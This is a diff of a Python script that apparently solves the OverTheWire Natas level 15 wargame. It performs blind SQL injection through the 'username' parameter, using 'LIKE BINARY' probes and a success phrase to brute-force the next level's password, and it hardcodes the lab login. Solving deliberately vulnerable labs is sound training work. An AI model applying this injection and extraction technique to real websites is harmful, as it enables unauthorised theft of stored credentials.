@@ -1,15 +1,44 @@
 import requests
 import string
 
+url = "http://natas15.natas.labs.overthewire.org"
+natas15_username = "natas15"
+natas15_password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
 
-chars = ''.join([string.ascii_letters, string.digits])
+success_phrase = "This user exists."
 
-payload = {'username': "natas16' and password is not null"}
-res = requests.post('http://natas15.natas.labs.overthewire.org/',
-                    auth=('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'),
-                    data=payload)
-content = res.text
-# print(content)
+characters = "".join([string.ascii_letters, string.digits])
 
-if 'This user exists.' in content:
-    print('Ok')
+
+def find_password_letters():
+    letters = []
+    print("Finding password letters...")
+    for c in characters:
+        uri = ''.join([url, '?', 'username=natas16"',
+                      '+and+password+LIKE+BINARY+"%', c, '%', '&debug'])
+        r = requests.get(uri, auth=(natas15_username, natas15_password))
+        if success_phrase in r.text:
+            letters.append(c)
+    print("All password letters found!")
+    return letters
+
+
+def brute_force_password(password_letters):
+    print("Brute-forcing password...")
+    password = ""
+    for i in range(1, 64):
+        for c in password_letters:
+            test = "".join([password, c])
+            uri = "".join([url, '?', 'username=natas16"',
+                           '+and+password+LIKE+BINARY+"', test, '%', '&debug'])
+            r = requests.get(uri, auth=(natas15_username, natas15_password))
+            if success_phrase in r.text:
+                password += c
+    print("Brute-forcing password complete!")
+    return password
+
+
+if __name__ == "__main__":
+    letters = find_password_letters()
+    password = brute_force_password(letters)
+    print("Password: ", password)
